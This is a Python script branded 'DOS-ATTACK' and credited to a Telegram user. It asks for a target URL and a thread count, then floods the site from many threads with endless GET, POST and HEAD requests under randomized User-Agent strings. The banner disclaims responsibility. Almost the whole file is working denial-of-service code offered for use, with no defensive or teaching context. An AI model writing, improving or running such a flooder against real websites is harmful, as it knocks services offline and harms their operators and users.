# usr/bin/env python

import requests
import subprocess as sb
from threading import Thread
from colorama import Fore, init
from progress.bar import IncrementalBar
from user_agent import generate_user_agent


class Main:

    def __init__(self):
        # Colorama init
        init()
        self.clear()
        # Colors
        self.green, self.red = Fore.GREEN, Fore.RED
        self.magenta, self.yellow = Fore.MAGENTA, Fore.YELLOW
        # Logo
        print(f"""{self.magenta}
        ██████╗░░█████╗░░██████╗░░░░░░░█████╗░████████╗░█████╗░░█████╗░██╗░░██╗
        ██╔══██╗██╔══██╗██╔════╝░░░░░░██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
        ██║░░██║██║░░██║╚█████╗░█████╗███████║░░░██║░░░███████║██║░░╚═╝█████═╝░
        ██║░░██║██║░░██║░╚═══██╗╚════╝██╔══██║░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
        ██████╔╝╚█████╔╝██████╔╝░░░░░░██║░░██║░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
        ╚═════╝░░╚════╝░╚═════╝░░░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝{self.green}
        _______________________________________________________________________
        █▀▀ █▀█ █▀▀ ▄▀█ ▀█▀ █▀▀ █▀▄   █▄▄ █▄█   ▄▀█ ▀▄▀ █░░
        █▄▄ █▀▄ ██▄ █▀█ ░█░ ██▄ █▄▀   █▄█ ░█░   █▀█ █░█ █▄▄

        [+] This script was created by a Telegram user: https://t.me/axl033
        [+] I am not responsible for your actions with the script, you do everything at your own risk.
        [+] Did you find a mistake? Let me know on Telegram.
        """)

        # Calling other methods
        self.dataRetrieval()
        self.checkingData()

    def dataRetrieval(self):
        # Getting the Data
        self.url = input(f"{self.yellow}[?] Provide a link: ")
        self.threads = input(f"{self.yellow}[?] Specify the number of threads: ")

    def checkingData(self):
        if "http" not in self.url:
            print(f"{self.red}[!] Provide the correct link.")
            self.dataRetrieval()
        else:
            try:
                self.threads = int(self.threads)
                self.openingStreams()
            except:
                print(
                    f"{self.red}[!] Specify the numerical value in the streams.")
                self.dataRetrieval()

    def flooding(self):
        while True:
            headers = {"User-Agent": generate_user_agent()}
            try:
                requests.get(self.url, headers=headers)
                requests.post(self.url, headers=headers)
                requests.head(self.url, headers=headers)
            except:
                pass

    def openingStreams(self):
        self.clear()
        with IncrementalBar('Opening streams', max=self.threads) as bar:
            for i in range(self.threads):
                Thread(target=self.flooding).start()
                bar.next()

        print(f"{self.yellow}[!] We start stressing!\n [!] Press CTRL + Z for stop!")


    def clear(self):
        try:
            sb.call(["cls"], shell=1)
        except:
            sb.call(["clear"], shell=1)


if __name__ == "__main__":
    Main()
